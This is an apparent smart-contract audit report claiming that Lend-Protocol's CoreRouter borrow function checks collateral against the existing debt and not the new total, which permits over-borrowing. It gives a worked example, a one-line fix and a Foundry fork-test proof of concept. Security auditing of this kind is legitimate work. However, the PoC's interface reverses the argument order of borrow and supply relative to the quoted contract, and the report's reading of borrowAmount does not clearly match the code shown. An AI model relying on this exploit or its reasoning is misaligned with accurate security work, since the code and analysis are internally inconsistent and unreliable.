**A user can borrow amount beyond collateral limit in Lend-Protocol**

_Bug Severity: High_

_Target:_
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2%2Fsrc%2FLayerZero%2FCoreRouter.sol#L145
 

**Summary:**

The borrow function is used to borrow debt from the protocol, and the function does not check borrowed and collateral properly, the require checks preBorrowAmount ( currentBorrowBalance ) instead of postBorrowAmount ( currentBorrowBalance + _amount ) this will allow borrowers to borrow debt more than their collateral


```solidity
// CoreRouter.sol
    function borrow(uint256 _amount, address _token) external {
    
     // ... existed code

        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

        uint256 borrowAmount = currentBorrow.borrowIndex != 0
            ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
            : 0;

@audit ---> This require will allow over borrowing because it checks only preBorrowAmount, to prevent this bug protocol has to change borrowAmount to borrowed

         require(collateral >= borrowAmount, "Insufficient collateral");

       // ... existed code

        // Emit BorrowSuccess event
        emit BorrowSuccess(msg.sender, _lToken, lendStorage.getBorrowBalance(msg.sender, _lToken).amount);
    }
```



**Vulnerability Details:**

A. A User deposited $1000 for example, and the collateral factor (LTV) is 0.8e18 (80%), that means the User has a chance to borrow $800

B. The User borrowed $500, the remaining borrowable balance = $300

C. The User tried to borrow $400 even though his available amount is $300

D. The function checks if the borrowAmount which $500 is equal or less than collateral.

E. The borrow function has indeed identified that the collateral > $500

F. The borrower has received $400, while his currentBorrowBalance is $500. that means the borrower has borrowed $900 instead of $800,that extra $100 will fall the user's debt underCollateralized.



**Impact:**

- Loss of protocol and Liquidators funds because the user's collateral can not pay the debt

- The protocol has to take responsibilities of these losses

- While the Liquidators will not receive their incentives.



**Recommendation:**

Change borrowAmount in require

```solidity

// from this
require(collateral >= borrowAmount, "Insufficient collateral");

// to this
require(collateral >= borrowed, "Insufficient collateral");

// borrowAmount = currentBorrowBalance e.g $500
// borrowed = currentBorrowBalance + _amount e.g $500 + $400 = $900.
```

**Proof of concept (PoC):**

The below PoC shows how a user deposited 1000 USDC and borrow 500 USDC first, then re-borrow 400 USDC even though the collateral factor (LTV) is 80% which is 800 USDC.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";



interface ICoreRouter {
    function supply(uint256 amount, address token) external;
    function borrow(address token, uint amount) external;
    function redeem(address token, uint amount) external;
}


contract LendOverBorrow is Test {

    address public USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public CoreRouter = 0x55b330049d46380BF08890EC21b88406eBFd20B0;
    address public User = 0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341;


function setUp() public {

    vm.createSelectFork(vm.envString("ETH_RPC_URL"), 19000000);

       deal(USDC, User, 10_000e6);

       uint bal = IERC20(USDC).balanceOf(User);
       console2.log("USDC Balance:", bal);

     
          vm.startPrank(User);
     IERC20(USDC).approve(CoreRouter, 1_000e6);


     console2.log("USDC Balance before deposit:", IERC20(USDC).balanceOf(User));

     console2.log("Allowance:", IERC20(USDC).allowance(User, CoreRouter));

     ICoreRouter(CoreRouter).supply(1_000e6, USDC);
     vm.stopPrank();
}

function test_over_borrow() public {
    vm.startPrank(User);

     ICoreRouter(CoreRouter).borrow(USDC, 500e6); 

     ICoreRouter(CoreRouter).borrow(USDC, 400e6); // Misali overly borrow

    vm.stopPrank();
}
}
```

